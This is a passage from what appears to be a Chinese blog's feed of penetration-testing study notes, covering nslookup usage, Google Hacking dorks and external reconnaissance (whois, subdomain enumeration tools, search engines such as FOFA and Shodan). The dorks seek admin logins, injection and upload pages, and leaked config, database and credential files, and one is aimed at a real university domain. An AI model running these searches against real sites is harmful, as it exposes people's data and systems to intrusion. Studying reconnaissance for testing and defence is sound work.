class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=cname baidu.com</span><br><span class="line">Server:10.123.119.98</span><br><span class="line">Address:10.123.119.98#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">*** Can&#x27;t find baidu.com: No answer</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line">baidu.com</span><br><span class="line">origin = dns.baidu.com</span><br><span class="line">mail addr = sa.baidu.com</span><br><span class="line">serial = 2012144164</span><br><span class="line">refresh = 300</span><br><span class="line">retry = 300</span><br><span class="line">expire = 2592000</span><br><span class="line">minimum = 7200</span><br></pre></td></tr></table></figure><p>（5）查询其他类型的记录。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=TYPE DOMAIN|IP [DNS-SERVER]</span><br><span class="line">nslookup -qt=type domain [dns-server]</span><br><span class="line">nslookup -type=type domain [dns-server]</span><br><span class="line"></span><br><span class="line">TYPE:</span><br><span class="line">AIPv4 地址记录</span><br><span class="line">    AAAAIPv6 地址记录  </span><br><span class="line">AFSDB Andrew文件系统数据库服务器记录 </span><br><span class="line">ATMA ATM地址记录 </span><br><span class="line">CNAME别名记录 </span><br><span class="line">HINFO硬件配置记录，包括CPU、操作系统信息 </span><br><span class="line">ISDN域名对应的ISDN号码 </span><br><span class="line">MB存放指定邮箱的服务器 </span><br><span class="line">MG邮件组记录 </span><br><span class="line">MINFO邮件组和邮箱的信息记录 </span><br><span class="line">MR改名的邮箱记录 </span><br><span class="line">MX邮件服务器记录 </span><br><span class="line">NS名字服务器记录 </span><br><span class="line">PTR反向记录 </span><br><span class="line">RP负责人记录 </span><br><span class="line">RT路由穿透记录 </span><br><span class="line">SRVTCP服务器信息记录 </span><br><span class="line">TXT域名对应的文本信息 </span><br><span class="line">X25域名对应的X.25地址记录</span><br></pre></td></tr></table></figure><hr><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h3 id="一个问题：-qt参数和-query效果等同吗"><a href="#一个问题：-qt参数和-query效果等同吗" class="headerlink" title="一个问题：-qt参数和-query效果等同吗"></a>一个问题：-qt参数和-query效果等同吗</h3><p>直接看图，在linux中的nslookup貌似不支持-qt，仅仅可以使用-query</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051435017.png" alt="image-20221005143556738" style="zoom:50%;" /><p>而在Windows中，都可以查询出结果</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051436322.png" alt="image-20221005143654079" style="zoom: 33%;" /><p>所以，，，，直接用query就好拉~</p><p>BUT，，<strong>关于 querytype 和 type 的小疑惑</strong></p><p>查看帮助文档：<code>man nslookup | less</code></p><p>得知：<code>-querytype</code> 和 <code>-type</code> 的效用一致，可以简写为 <code>-q</code> 和 <code>-ty</code>，其在不指定类型的情况下默认查询类型为 <strong>A</strong></p><p>搞不懂、、、、、、、、、、这他喵的</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://linux.die.net/man/1/nslookup">nslookup(1) manual</a> </li><li><a href="https://www.cnblogs.com/Renyi-Fan/p/9045879.html">nslookup详解(name server lookup)( 域名查询)</a></li><li><a href="https://www.geeksforgeeks.org/nslookup-command-in-linux-with-examples/">GeeksforGeeks.nslookup command in Linux with Examples</a> </li><li><a href="https://blog.csdn.net/dengjin20104042056/article/details/99977872">【Linux】一步一步学Linux——nslookup命令(161)</a></li><li><a href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></li><li><a href="https://www.cnblogs.com/qianjinyan/p/6636047.html">https://www.cnblogs.com/qianjinyan/p/6636047.html</a></li><li><a href="https://www.cnblogs.com/yonghegn/p/10059997.html">https://www.cnblogs.com/yonghegn/p/10059997.html</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking语法</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Google-Hacking%E8%AF%AD%E6%B3%95.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Google-Hacking%E8%AF%AD%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="GoogleHacking语法介绍"><a href="#GoogleHacking语法介绍" class="headerlink" title="GoogleHacking语法介绍"></a>GoogleHacking语法介绍</h1><h2 id="GoogleHacking常用语法"><a href="#GoogleHacking常用语法" class="headerlink" title="GoogleHacking常用语法"></a>GoogleHacking常用语法</h2><blockquote><p>（冒号后面不用加空格</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件</span><br><span class="line">intitle： 把网页标题中的某个字符作为搜索的条件</span><br><span class="line">cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</span><br><span class="line">filetype/ext： 指定一个格式类型的文件作为搜索对象</span><br><span class="line">inurl： 搜索包含指定字符的URL</span><br><span class="line">site： 在指定的(域名)站点搜索相关内容</span><br></pre></td></tr></table></figure><h2 id="GoogleHacking其他语法"><a href="#GoogleHacking其他语法" class="headerlink" title="GoogleHacking其他语法"></a>GoogleHacking其他语法</h2><blockquote><ol><li>引号 ‘’ “ 把关键字打上引号后，把引号部分作为整体来搜索</li><li>or 同时搜索两个或更多的关键字</li><li>link: 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL</li><li>info: 查找指定站点的一些基本信息</li><li><a href="http://www.google.com/custom?domains=URL">http://www.google.com/custom?domains=URL</a> 可实现站内搜索</li><li>关键字不区分大小写字母</li><li>默认使用AND逻辑搜索</li><li>Google在默认下忽视关键字中部分常用单词(如冠词)；</li><li>Google默认限制关键字最多32个单词，但”<em>“不占用字符限制位，活用</em>突破限制；</li><li>“+”强制搜索其后的一个单词，可以取消之前说的Google对常用单词的忽视(AND逻辑)，但是大部分常用英文符号(如问号，句号，逗号等)无法成为搜索关键字，加强制也不行；</li><li>“-“强制忽略其后的一个单词，可以屏蔽包含某些关键字的网页(NOT逻辑)(如A-C在结果中呈现的网页则是含有A且不含有C的)；</li><li>“|”或”OR”(使用时操作符前后都要加空格)，对只要符合多个关键字中的任意一个的结果予以显示；</li><li>混合使用多种布尔操作时以从左到右的顺序执行而不是以数学逻辑。</li></ol></blockquote><h2 id="Google-hacking语法收集网站"><a href="#Google-hacking语法收集网站" class="headerlink" title="Google hacking语法收集网站"></a>Google hacking语法收集网站</h2><blockquote><p><a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a></p></blockquote><h1 id="GoogleHacking经典语法"><a href="#GoogleHacking经典语法" class="headerlink" title="GoogleHacking经典语法"></a>GoogleHacking经典语法</h1><h2 id="GoogleHacking典型用法"><a href="#GoogleHacking典型用法" class="headerlink" title="GoogleHacking典型用法"></a>GoogleHacking典型用法</h2><h3 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br><span class="line"></span><br><span class="line">www.fi11sm33.com</span><br><span class="line">site:*.jxau.edu.*  intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br></pre></td></tr></table></figure><h3 id="上传类漏洞地址"><a href="#上传类漏洞地址" class="headerlink" title="上传类漏洞地址"></a>上传类漏洞地址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:file    </span><br><span class="line">site:target.com inurl:upload</span><br></pre></td></tr></table></figure><h3 id="注入页面"><a href="#注入页面" class="headerlink" title="注入页面"></a>注入页面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:php?id=</span><br></pre></td></tr></table></figure><h3 id="编辑器页面"><a href="#编辑器页面" class="headerlink" title="编辑器页面"></a>编辑器页面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com intitle:index.of</span><br></pre></td></tr></table></figure><h3 id="SQL错误"><a href="#SQL错误" class="headerlink" title="SQL错误"></a>SQL错误</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure><h3 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure><h3 id="数据库文件泄露"><a href="#数据库文件泄露" class="headerlink" title="数据库文件泄露"></a>数据库文件泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure><h3 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.log</span><br></pre></td></tr></table></figure><h3 id="备份和历史文件泄露"><a href="#备份和历史文件泄露" class="headerlink" title="备份和历史文件泄露"></a>备份和历史文件泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure><h3 id="公开文件泄露"><a href="#公开文件泄露" class="headerlink" title="公开文件泄露"></a>公开文件泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure><h3 id="邮箱信息"><a href="#邮箱信息" class="headerlink" title="邮箱信息"></a>邮箱信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件</span><br><span class="line">site:target.com email</span><br></pre></td></tr></table></figure><h3 id="社工信息"><a href="#社工信息" class="headerlink" title="社工信息"></a>社工信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/22161675">https://zhuanlan.zhihu.com/p/22161675</a></li><li><a href="https://www.cnblogs.com/R-S-PY/p/12751856.html">https://www.cnblogs.com/R-S-PY/p/12751856.html</a></li><li><a href="https://www.cnblogs.com/wwcdg/p/15913895.html#1_29">https://www.cnblogs.com/wwcdg/p/15913895.html#1_29</a></li><li><a href="https://zhuanlan.zhihu.com/p/22161675">https://zhuanlan.zhihu.com/p/22161675</a></li><li><a href="https://www.cxymm.net/article/qq_43531669/112726913">https://www.cxymm.net/article/qq_43531669/112726913</a></li><li><a href="https://blog.csdn.net/huweiliyi/article/details/105442118">https://blog.csdn.net/huweiliyi/article/details/105442118</a></li><li><a href="https://www.heibai.org/975.html">https://www.heibai.org/975.html</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x05 - 外网信息收集</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/0x05-%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/0x05-%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集简介"><a href="#信息收集简介" class="headerlink" title="信息收集简介"></a>信息收集简介</h1><h2 id="什么是信息收集"><a href="#什么是信息收集" class="headerlink" title="什么是信息收集"></a>什么是信息收集</h2><blockquote><p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。比如目标站点IP、中间件、脚本语言、端口、邮箱等等。信息收集包含资产收集但不限于资产收集。</p></blockquote><h2 id="信息收集的意义"><a href="#信息收集的意义" class="headerlink" title="信息收集的意义"></a>信息收集的意义</h2><blockquote><ul><li>信息收集是渗透测试成功的保障</li><li>更多的暴露面</li><li>更大的可能性</li></ul></blockquote><h2 id="信息收集分类"><a href="#信息收集分类" class="headerlink" title="信息收集分类"></a>信息收集分类</h2><blockquote><ul><li>主动信息收集</li></ul><p>通过直接访问网站在网站上进行操作、对网站进行扫描等，这种是有网络流量经过目标服务器的信息收集方式。会被日志记录下来</p><ul><li>被动信息收集</li></ul><p>基于公开的渠道，比如搜索引擎等，在不与目标系统直接交互的情况下获取信息，并且尽量避免留下痕迹。</p></blockquote><h2 id="收集哪些信息"><a href="#收集哪些信息" class="headerlink" title="收集哪些信息"></a>收集哪些信息</h2><blockquote><ul><li>域名信息（whois、备案信息、子域名）</li><li>服务器信息（端口、服务、真实IP）</li><li>网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、WAF、敏感目录、敏感文件、源码泄露、旁站、C段）</li><li>管理员信息（姓名、职务、生日、联系电话、邮件地址）</li></ul></blockquote><h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="域名介绍"><a href="#域名介绍" class="headerlink" title="域名介绍"></a>域名介绍</h2><blockquote><p>域名（Domain Name），简称域名、网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。</p><p>DNS（域名系统，Domain Name System）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p></blockquote><h2 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h2><p>二级域名是指顶级域名之下的域名，在国际顶级域名下，它是指域名注册人的网上名称，例如 ibm，yahoo，microsoft等；在国家顶级域名下，它是表示注册企业类别的符号，例如com，top，edu，gov，net等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210011407071.png" alt="image-20221001140659879" style="zoom:50%;" /><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><h3 id="whois简介"><a href="#whois简介" class="headerlink" title="whois简介"></a>whois简介</h3><p>Whois 是用来查询域名的IP以及所有者等信息的传输协议。就是一个用来查询域名是否被注册，以及注册域名的详细信息的数据库(如域名所有人，域名注册商)Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）。通过域名Whois服务器查询，可以查询域名归属者联系方式，以及注册和到期时间</p><h4 id="WHOIS协议是什么？"><a href="#WHOIS协议是什么？" class="headerlink" title="WHOIS协议是什么？"></a>WHOIS协议是什么？</h4><blockquote><p><a href="http://www.biancheng.net/">www.biancheng.net</a></p></blockquote><p>whois查询的用处：通过whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站域名注册者就是网站管理员。利用搜索引擎对whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</p><h4 id="在继续进行之前，请务必熟悉以下术语："><a href="#在继续进行之前，请务必熟悉以下术语：" class="headerlink" title="在继续进行之前，请务必熟悉以下术语："></a>在继续进行之前，请务必熟悉以下术语：</h4><blockquote><ul><li>Registry: A company that manages a list containing a set of domain names (there are many of these).</li></ul><p>注册表：一家管理包含一组域名(很多域名)的列表的公司。</p><ul><li>Registrant: The legal owner of the domain; it’s registered to this person.</li></ul><p>注册人：域名的合法所有者； 它已注册到此人。</p><ul><li>Registrar: A registrant uses a registrar to make his or her registration.</li></ul><p>注册服务商：注册人使用注册服务商进行注册。</p></blockquote><h4 id="典型的whois记录将包含以下信息："><a href="#典型的whois记录将包含以下信息：" class="headerlink" title="典型的whois记录将包含以下信息："></a>典型的whois记录将包含以下信息：</h4><blockquote><ul><li>The name and contact information of the registrant: The owner of the domain.注册人的姓名和联系信息：域的所有者。</li><li>The name and contact information of the registrar: The organization that registered the domain name.注册商的名称和联系信息：注册域名的组织。</li><li>The registration date.注册日期。</li><li>When the information was last updated.信息的最新更新时间。</li><li>The expiration date.到期日期。</li></ul></blockquote><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><h4 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询"></a>web接口查询</h4><blockquote><ul><li><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p></li><li><p><a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></p></li><li><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p></li></ul></blockquote><h4 id="whois命令行查询"><a href="#whois命令行查询" class="headerlink" title="whois命令行查询"></a>whois命令行查询</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在云机器Ubuntu上安装了whois命令</span></span><br><span class="line">whois hetianlab.com</span><br></pre></td></tr></table></figure><h4 id="python脚本查询"><a href="#python脚本查询" class="headerlink" title="python脚本查询"></a>python脚本查询</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> whois  </span><br><span class="line">  </span><br><span class="line">domain = <span class="built_in">input</span>(<span class="string">&quot;输入查询 Whois 的域名：&quot;</span>)</span><br><span class="line">data = whois.whois(domain)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;域名：%s&quot;</span> % data[<span class="string">&#x27;domain_name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;邮箱：%s&quot;</span> % data[<span class="string">&#x27;emails&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;注册人：%s&quot;</span> % data[<span class="string">&#x27;org&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;注册时间：%s&quot;</span> % data[<span class="string">&#x27;creation_date&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;更新时间：%s&quot;</span> % data[<span class="string">&#x27;updated_date&#x27;</span>])</span><br></pre></td></tr></table></figure><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>备案号是网站是否合法注册经营的标志，可以用网页的备案号反查出该公司旗下的资产。</p><p>web接口查询</p><blockquote><ul><li><p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p></li><li><p><a href="http://www.beian.gov.cn/portal/registerSystemInfo">http://www.beian.gov.cn/portal/registerSystemInfo</a></p></li><li><p><a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></p></li><li><p><a href="https://icplishi.com/">https://icplishi.com/</a></p></li></ul></blockquote><h2 id="Whois反查"><a href="#Whois反查" class="headerlink" title="Whois反查"></a>Whois反查</h2><p>whois反查，可以通过注册人、注册人邮箱、注册人手机电话反查whois信息先通过whois获取注册人和邮箱，再通过注册人和邮箱反查域名。</p><p>缺点是很多公司都是DNS解析的运营商注册的,查到的是运营商代替个人和公司注册的网站信息。</p><blockquote><ul><li><p><a href="https://whois.chinaz.com/reverse?ddlSearchMode=1">https://whois.chinaz.com/reverse?ddlSearchMode=1</a></p></li><li><p><a href="http://whois.4.cn/reverse">http://whois.4.cn/reverse</a></p></li><li><p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p></li></ul></blockquote><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><h3 id="子域名简介"><a href="#子域名简介" class="headerlink" title="子域名简介"></a>子域名简介</h3><blockquote><p>子域名指二级域名,二级域名是顶级域名(一级域名)的下一级。比如 mail.heetian.com 和 bbs.heetian.com 是 heetian.com 的子域，而heetian.com 则是顶级域名 .com 的子域。</p></blockquote><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><blockquote><p>子域名查找：从旁站查找漏洞会容易一点，一般主站的防御会比较好</p></blockquote><h3 id="脚本查询"><a href="#脚本查询" class="headerlink" title="脚本查询"></a>脚本查询</h3><p>老师脚本换行出了问题 回头学好python再来研究，脚本在<code>F:\Learning\ComputerScience\Cyber Security\Tools-Hetian\Tools-Hetian\子域名信息收集</code>目录下</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 .\domain_search.py hetianlab.com 10</span><br></pre></td></tr></table></figure><h3 id="第三方Web接口"><a href="#第三方Web接口" class="headerlink" title="第三方Web接口"></a>第三方Web接口</h3><blockquote><ul><li><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p></li><li><p><a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a></p></li><li><p><a href="https://developers.virustotal.com/reference/domains-relationships">https://developers.virustotal.com/reference/domains-relationships</a></p></li><li><p><a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a></p></li><li><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p></li><li><p><a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p></li></ul></blockquote><h3 id="网络空间安全搜索引擎"><a href="#网络空间安全搜索引擎" class="headerlink" title="网络空间安全搜索引擎"></a>网络空间安全搜索引擎</h3><blockquote><p><a href="https://fofa.info/">https://fofa.info/</a><br><code>domain=&quot;hetianlab.com&quot;</code></p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><code>site:&quot;hetianlab.com&quot;</code></p><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br><code>domain=&quot;hetianlab.com&quot;</code></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><code>hostname:baidu.com</code></p></blockquote><h3 id="SSL证书查询"><a href="#SSL证书查询" class="headerlink" title="SSL证书查询"></a>SSL证书查询</h3><blockquote><p><a href="https://crt.sh/">https://crt.sh/</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210011610400.png" alt="image-20221001161033151" style="zoom:50%;" /><blockquote><p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210011611172.png" alt="image-20221001161100937" style="zoom:50%;" /><h3 id="JS文件发现子域名"><a href="#JS文件发现子域名" class="headerlink" title="JS文件发现子域名"></a>JS文件发现子域名</h3><blockquote><p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><p>一种不错的方法，因为网站基本上都有js</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u url</span><br></pre></td></tr></table></figure><h2 id="子域名收集工具"><a href="#子域名收集工具" class="headerlink" title="子域名收集工具"></a>子域名收集工具</h2><ol><li>子域名挖掘机layer</li></ol><blockquote><p>较好用</p></blockquote><ol><li>OneForAll</li></ol><blockquote><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p></blockquote><ol start="3"><li>Subdomainsbrute-高并发的DNS暴力枚举工具</li></ol><blockquote><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p></blockquote><ol start="4"><li>Sublist3r</li></ol><blockquote><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p></blockquote><ol start="5"><li>ESD</li></ol><blockquote><p><a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a></p></blockquote><ol start="6"><li>dnsbrute</li></ol><blockquote><p><a href="https://github.com/Q2h1Cg/dnsbrute">https://github.com/Q2h1Cg/dnsbrute</a></p></blockquote><ol start="7"><li>Anubis</li></ol><blockquote><p><a href="https://github.com/jonluca/Anubis">https://github.com/jonluca/Anubis</a></p></blockquote><ol start="8"><li>subdomain3</li></ol><blockquote><p><a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p></blockquote><ol start="9"><li>teemo</li></ol><blockquote><p><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a></p><blockquote><p>域名收集及枚举工具，小迪推荐，需要配置API，集成了较多方式获取域名</p></blockquote></blockquote><ol start="10"><li>Sudomy</li></ol><blockquote><p><a href="https://github.com/screetsec/Sudomy">https://github.com/screetsec/Sudomy</a></p></blockquote><ol start="11"><li>ARL</li></ol><p>web后台工具，资产灯塔，不仅仅是域名收集，挺好用，建议docker搭建</p><blockquote><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TophantTechnology/ARL</span><br><span class="line"><span class="built_in">cd</span> ARL/docker/</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p><a href="https://124.223.217.243:5003/login">https://124.223.217.243:5003/login</a></p><p>默认端口5003 (https), 默认用户名密码admin&#x2F;arlpass</p></blockquote><ol start="12"><li>SubFinder + KSubdomain + HttpX</li></ol><blockquote><p>组合使用</p><p>工具箱中有这个工具<code>SubFinder + KSubdomain + HttpX</code></p><p>将域名放在<code>domain.py</code>文件，再执行</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 get_domain.py</span><br></pre></td></tr></table></figure></blockquote><blockquote><ul><li>SubFinder：用来查询域名的子域名信息的工具，可以使用很多国外安全网站的api接口进行自动化搜索子域名信息。</li></ul><blockquote><p><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p></blockquote><ul><li>HttpX：一款运行速度极快的多功能HTTP安全工具，它可以使用retryablehttp库来运行多种网络探针，并使用了多线程机制来维持运行的稳定性和结果的准确性。</li></ul><blockquote><p><a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p></blockquote><ul><li>ksubdomain是一款基于无状态子域名爆破工具，支持在Windows&#x2F;Linux&#x2F;Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w&#x2F;s,linux上为160w&#x2F;s的速度。</li></ul><blockquote><p><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p></blockquote></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#subfinder基本使用</span></span><br><span class="line">./subfinder -d baidu.com -o output.txt                         </span><br><span class="line">                      </span><br><span class="line"><span class="comment">#ksubdomain基本使用</span></span><br><span class="line">./ksubdomain -d baidu.com</span><br><span class="line"><span class="comment">#管道操作</span></span><br><span class="line">./subfinder -d baidu.com -silent|./ksubdomain -verify -silent|./httpx -title -content-length -status-code</span><br><span class="line"><span class="comment">#可以用管道结合在一起配合工作。达到收集域名，验证域名，http验证存活目的。</span></span><br></pre></td></tr></table></figure><h2 id="根据网站标题收集域名"><a href="#根据网站标题收集域名" class="headerlink" title="根据网站标题收集域名"></a>根据网站标题收集域名</h2><blockquote><p>用百度、谷歌搜索相关键网站   用xx&#x2F;robots.tex、或者检查-Network 抓包看内容，搜索域名关键字</p></blockquote><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><blockquote><p><a href="https://11pmsleep.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Google-Hacking%E8%AF%AD%E6%B3%95.html">Google Hacking语法 | 晚上十一点睡觉 (11pmsleep.github.io)</a></p></blockquote><h2 id="域名信息收集思维导图"><a href="#域名信息收集思维导图" class="headerlink" title="域名信息收集思维导图"></a>域名信息收集思维导图</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210271342873.png" alt="image"></p><h1 